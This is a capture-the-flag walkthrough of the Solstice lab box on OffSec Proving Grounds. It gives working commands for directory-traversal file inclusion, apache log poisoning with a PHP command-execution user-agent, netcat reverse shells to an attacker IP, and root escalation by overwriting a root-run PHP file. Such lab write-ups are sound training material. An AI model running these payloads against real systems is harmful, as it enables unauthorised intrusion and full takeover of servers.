# Solstice

This is a walkthrough for Solstice, an easy rated box on Offensive Security's "Proving Grounds".

https://www.offensive-security.com/

The basic pathway we will follow is:

1. Scan to enumerate open services.
2. LFI through exposed PHP import parameter on Web Server
3. LFI to RCE through apache.log poisoning
4. Foothold through PHP reverse shell via RCE
5. Priv Esc through reverse shell via PHP server on localhost

### Tools

- Kali Linux
- nmap
- dotdotpwn
- curl

### Notes

-

### Target

- The target IP for this walkthrough was:
  IP: 192.168.154.72

# Enumerate

## Port Scan

We begin our enumeration with an nmap service and version scan of all TCP ports:
    
    nmap -sV -sC -p- -n 192.168.154.72 -oN nmapscan

Our scan reveals quite a few open ports including **FTP**, **SMTP**, and **HTTP** servers.

```
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-29 10:28 EDT
Stats: 0:01:34 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 93.06% done; ETC: 10:29 (0:00:03 remaining)
Nmap scan report for 192.168.154.72                                                           
Host is up (0.032s latency).                                                                  
Not shown: 65526 closed tcp ports (conn-refused)
PORT      STATE SERVICE    VERSION                                                            
21/tcp    open  ftp        pyftpdlib 1.5.6
| ftp-syst:                                                                                                                                                                                  
|   STAT:                                                                                     
| FTP server status:
|  Connected to: 192.168.154.72:21                                                            
|  Waiting for username.
|  Connected to: 192.168.154.72:21                                                                                                                                                    [0/134]
|  Waiting for username.                                                                      
|  TYPE: ASCII; STRUcture: File; MODE: Stream                                                 
|  Data connection closed.                                                                    
|_End of status.                                                                              
22/tcp    open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:                                                                                
|   2048 5ba737fd556cf8ea03f510bc94320718 (RSA)             
|   256 abda6a6f973fb2703e6c2b4b0cb7f64c (ECDSA)                       
|_  256 ae29d4e346a1b15227838f8fb0c436d1 (ED25519)                                            
25/tcp    open  smtp       Exim smtpd                                                         
| smtp-commands: solstice Hello nmap.scanme.org [192.168.45.162], SIZE 52428800, 8BITMIME, PIPELINING, CHUNKING, PRDR, HELP                                                                  
|_ Commands supported: AUTH HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP
80/tcp    open  http       Apache httpd 2.4.38 ((Debian))            
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html).                                          
2121/tcp  open  ftp        pyftpdlib 1.5.6                                                    
| ftp-syst:                                                                                   
|   STAT:                                                                                     
| FTP server status:                                                                          
|  Connected to: 192.168.154.72:2121                                                          
|  Waiting for username.  
|  TYPE: ASCII; STRUcture: File; MODE: Stream
|  Data connection closed.
|_End of status.            
| ftp-anon: Anonymous FTP login allowed (FTP code 230)                                        
|_drws------   2 www-data www-data     4096 Jun 18  2020 pub                                  
3128/tcp  open  http-proxy Squid http proxy 4.6                                
|_http-server-header: squid/4.6
|_http-title: ERROR: The requested URL could not be retrieved                                 
8593/tcp  open  http       PHP cli server 5.5 or later (PHP 7.3.14-1)                         
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-cookie-flags:                                                                                                                                                                         
|   /:                                                                                        
|     PHPSESSID:                                                                              
|_      httponly flag not set                                                                 
54787/tcp open  http       PHP cli server 5.5 or later (PHP 7.3.14-1)                         
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).                           
62524/tcp open  ftp        FreeFloat ftpd 1.00                                                
Service Info: OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows   
                                               
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                                                               
Nmap done: 1 IP address (1 host up) scanned in 103.34 seconds
```

## Web enumeration

Further enumeration of the open ports reveals something interesting on the HTTP server running on port 8593.

On the main page we see:

![Image](/assets/images/solstice_main_page.png)

If we follow the link to for "Book List" we find a PHP page with exposed parameters in the address bar.

![Image](/assets/images/solstice_booklist.png)

Testing this parameter for **local file Inclusion** reveals it is vulnerabie to **LFI** through **directory traversal**.

![Image](/assets/images/solstice_lfi_test.png)

Armed with this knowledge we can begin our attack.

# Exploit

With the ability to read arbitrary files through a php enabled web server we can conduct a **log poisoning attack** to achieve **remote code execution** and gain a foothold on the box.

Our earlier nmap scan showed an apache web server running on port 80.  We can insert a PHP code snippet into `apache.log`by sending a request to the server with a modified user-agent header.  We can then trigger execution of this snippet on the server through our previously discovered LFI vulnerability.

First we confirm our ability to access apache.log via LFI.

```
curl http://192.168.154.72:8593/index.php?book=../../../../../var/log/apache2/access.log
```

![Image](/assets/images/solstice_accesslog.png)

Next we send a request with a modified user-agent containing our PHP payload to the apache server.  This snippet will allow us to execute arbitrary CLI commands using the LFI vulnerability.

```
curl -A "<?php system(\$_GET['cmd']); ?>" http://192.168.154.72
```

![Image](/assets/images/solstice_payload.png)

Accessing apache.log again shows a new entry in the log with a blank user agent.  The user-agent appears blank because our snippet is being interpreted and executed as php code instead of being served as plaintext.

```
curl http://192.168.154.72:8593/index.php?book=../../../../../var/log/apache2/access.log
```

![Image](/assets/images/solstice_blank_useragent.png)

Next we confirm that our exploit is working by triggering a simple cli `id` command. 

```
curl "http://192.168.154.72:8593/index.php?book=../../../../../var/log/apache2/access.log&cmd=id"
```

![Image](/assets/images/solstice_payload_test.png)

We can see that the blank user-agent has been replaced with the output from the `id` command.

Finally, we will use this LFI to RCE path to execute a reverse shell and gain our foothold on the box.

First we start a netcat listener.

```
nc -lvnp 4444
```

![Image](/assets/images/solstice_netcat_listener.png)

Then we send a new request with a command to establish a netcat connection.

```
curl "http://192.168.154.72:8593/index.php?book=../../../../../var/log/apache2/access.log&cmd=nc%20192.168.45.162%204444%20-e%20%2F/bin/bash%20"
```

Going back to our listener we see:

![Image](/assets/images/solstice_netcat_connection.png)

A quick `whoami` confirms we have a shell as the www-data user.

```
whoami
```

![Image](/assets/images/solstice_whoami.png)
Finally, lets upgrade our shell with the following command:

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

![Image](/assets/images/solstice_shell_upgrade.png)

## Priv Esc

An examination of running processes reveals a php server server running as root pointing to /var/tmp/sv.

```
ps -ef | grep root
```

![Image](/assets/images/solstice_php_process.png)

A look in `/var/tmp/sv` reveals an `index.php` page with write permissions.

![Image](/assets/images/solstice_indexphp.png)

![Image](/assets/images/solstice_indexphp_contents.png)

We can replace the contents of this file with another reverse shell PHP snippet and execute it with curl.

First we insert the snippet and check the contents of `index.php`.
```
echo "<?php system('nc 192.168.45.162 9999 -e /bin/bash')?>" > /var/tmp/sv/index.php
```

![Image](/assets/images/solstice_inexphp_check.png)

Next we start a new nc listener on our attacker machine.
```
nc -lvnp 9999
```

Then we run our `curl` command on the target machine to execute the code.
```
curl 127.0.0.1:57
```

We should now see a new connection to our netcat listener.  Running `whoami` confirms we now have root!

![Image](/assets/images/solstice_root.png)
